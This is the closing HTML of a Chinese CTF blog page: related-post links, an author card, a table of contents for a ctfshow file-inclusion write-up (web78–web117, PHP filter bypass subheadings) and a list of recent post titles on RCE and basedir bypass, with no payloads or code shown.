fa-fw"></i> 2022-10-14</div><div class="title">PHP伪随机数漏洞</div></div></a></div><div><a href="/2022/10/30/RCE%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%951/" title="RCE绕过手法1"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-30</div><div class="title">RCE绕过手法1</div></div></a></div><div><a href="/2022/10/31/RCE%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="RCE题目记录"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-31</div><div class="title">RCE题目记录</div></div></a></div><div><a href="/2022/10/16/SSTI/" title="SSTI学习"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-16</div><div class="title">SSTI学习</div></div></a></div><div><a href="/2022/10/30/ctfwhow%E7%88%86%E7%A0%B4%E7%AF%87/" title="ctfwhow爆破篇"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-30</div><div class="title">ctfwhow爆破篇</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Yangyangyang</div><div class="author-info__description">hello,every body!~</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78"><span class="toc-number">1.</span> <span class="toc-text">web78</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79"><span class="toc-number">2.</span> <span class="toc-text">web79</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80"><span class="toc-number">3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81"><span class="toc-number">4.</span> <span class="toc-text">web81</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82-86"><span class="toc-number">5.</span> <span class="toc-text">web82-86</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87"><span class="toc-number">6.</span> <span class="toc-text">web87</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8base64%E7%BB%95%E8%BF%87"><span class="toc-number">6.1.</span> <span class="toc-text">使用base64绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.2.</span> <span class="toc-text">使用字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8rot13"><span class="toc-number">6.3.</span> <span class="toc-text">使用rot13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%B5%8C%E5%A5%97"><span class="toc-number">6.4.</span> <span class="toc-text">过滤器的嵌套</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-put-contents-a-%E2%80%9D-lt-php-exit-%E2%80%9D-a"><span class="toc-number">6.5.</span> <span class="toc-text">file_put_contents($a,”&lt;?php exit();”.$a);</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88"><span class="toc-number">7.</span> <span class="toc-text">web88</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web117"><span class="toc-number">8.</span> <span class="toc-text">web117</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow/" title="文件包含-ctfshow"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件包含-ctfshow"/></a><div class="content"><a class="title" href="/2022/11/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-ctfshow/" title="文件包含-ctfshow">文件包含-ctfshow</a><time datetime="2022-11-06T12:28:45.000Z" title="发表于 2022-11-06 20:28:45">2022-11-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/05/%E7%BB%95%E8%BF%87basedir%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/" title="绕过basedir获取目录+读取文件"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="绕过basedir获取目录+读取文件"/></a><div class="content"><a class="title" href="/2022/11/05/%E7%BB%95%E8%BF%87basedir%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/" title="绕过basedir获取目录+读取文件">绕过basedir获取目录+读取文件</a><time datetime="2022-11-05T12:52:56.000Z" title="发表于 2022-11-05 20:52:56">2022-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/04/Verilog%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" title="Verilog学习笔记1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Verilog学习笔记1"/></a><div class="content"><a class="title" href="/2022/11/04/Verilog%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" title="Verilog学习笔记1">Verilog学习笔记1</a><time datetime="2022-11-04T12:38:24.000Z" title="发表于 2022-11-04 20:38:24">2022-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/03/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="无字母数字的命令执行"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无字母数字的命令执行"/></a><div class="content"><a class="title" href="/2022/11/03/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="无字母数字的命令执行">无字母数字的命令执行</a><time datetime="2022-11-03T15:05:30.000Z" title="发表于 2022-11-03 23:05:30">2022-11-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/31/RCE%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="RCE题目记录"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RCE题目记录"/></a><div class="content"><a class="title" href="/2022/10/31/RCE%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/" title="RCE题目记录">RCE题目记录</a><time datetime="2022-10-31T03:12:03.000Z" title="发表于 2022-10-31 11:12:03">2022-10-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Yangyangyang</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
